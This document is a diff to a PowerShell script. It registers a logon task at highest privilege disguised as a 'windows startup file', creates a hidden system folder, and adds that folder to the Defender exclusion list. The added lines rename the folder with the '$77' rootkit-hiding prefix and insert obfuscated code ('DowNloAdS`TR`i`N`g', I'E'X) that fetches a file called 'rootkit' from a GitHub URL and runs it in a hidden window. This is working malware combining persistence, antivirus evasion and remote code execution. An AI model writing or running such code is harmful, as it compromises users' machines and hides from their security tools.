@@ -4,9 +4,13 @@ $task_trigger = New-ScheduledTaskTrigger -AtLogOn
 $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
 Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force
 
-$rdir = "$env:SystemDrive\ProgramData\Loader"
+$rdir = "$env:SystemDrive\ProgramData\`$77Loader"
 $dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
 $startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
 New-Item -ItemType Directory -Path $dir
 Add-MpPreference -ExclusionPath $dir
 attrib +h +s $dir
+
+$shellcode = ("https://raw.githubusercontent.com/43a1723/test22/refs/heads/main/rootkit")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
